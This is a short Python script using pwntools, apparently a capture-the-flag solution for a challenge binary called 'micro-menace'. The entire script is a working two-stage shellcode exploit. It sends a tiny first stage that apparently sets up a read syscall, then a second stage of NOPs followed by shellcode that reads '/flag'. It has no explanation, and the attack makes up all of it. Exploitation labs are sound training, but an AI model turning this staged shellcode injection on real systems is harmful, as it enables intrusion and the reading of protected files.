#!/usr/bin/env python3
import itertools
from pwn import *
import os

context.update(arch="amd64", os="linux")
context.log_level = "error"

target_binary = "/challenge/micro-menace"

stage ="""
.intel_syntax noprefix
    push rax
    pop rdi
    push rdx
    pop rsi
    syscall
"""

payload = asm(stage)

p = process(target_binary)
p.send(payload)

time.sleep(0.1)

stage2 = asm("nop;" * 6 + shellcraft.cat("/flag"))
p.send(stage2)

p.interactive()
